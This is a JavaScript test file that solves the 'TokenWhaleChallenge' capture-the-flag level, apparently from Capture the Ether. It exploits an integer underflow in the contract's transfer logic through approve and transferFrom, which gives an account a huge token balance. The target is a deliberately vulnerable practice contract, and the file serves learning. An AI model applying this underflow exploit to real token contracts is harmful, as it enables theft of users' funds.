const { assert } = require("chai");
const { deployContract } = require("ethereum-waffle");
const { BigNumber } = require("ethers");
const { accessListify } = require("ethers/lib/utils");
const { ethers, getNamedAccounts } = require("hardhat");

describe("08-TokenWhaleChallenge", function () {
    let deployerContract, playerContract, player2Contract, value, player, player2;
    beforeEach(async function () {
        //make a snapshot by calling fixture
        await deployments.fixture("8");
        //deployer has all tokens
        deployer = (await getNamedAccounts()).deployer;
        player = (await getNamedAccounts()).player;
        player2 = (await getNamedAccounts()).player2;
        value = ethers.utils.parseEther("1");
        //get contract instances connected to 2 different accounts
        deployerContract = await ethers.getContract("TokenWhaleChallenge", deployer);
        playerContract = await ethers.getContract("TokenWhaleChallenge", player);
    });

    describe("call approve, transferFrom and make  use of unchecked balance from _transfer function", async function () {
        it("create from thin air a huge amount of tokens and send it to deployer address", async function () {
            //approve 'player' to spend 10 tokens from 'deployer' balance
            await deployerContract.approve(player, 10);
            //player balance will underflow
            await playerContract.transferFrom(deployer, player2, 1);
            const playerBalance = await playerContract.balanceOf(player);
            console.log("playerBalance = ", playerBalance.toString());
            assert.equal(playerBalance > 1, true);
            // Send 1M tokens from player to deployer
            await playerContract.transfer(deployer, 1000000);
            const isComplete = await playerContract.isComplete();
            assert.equal(isComplete, true);
        });
    });
});
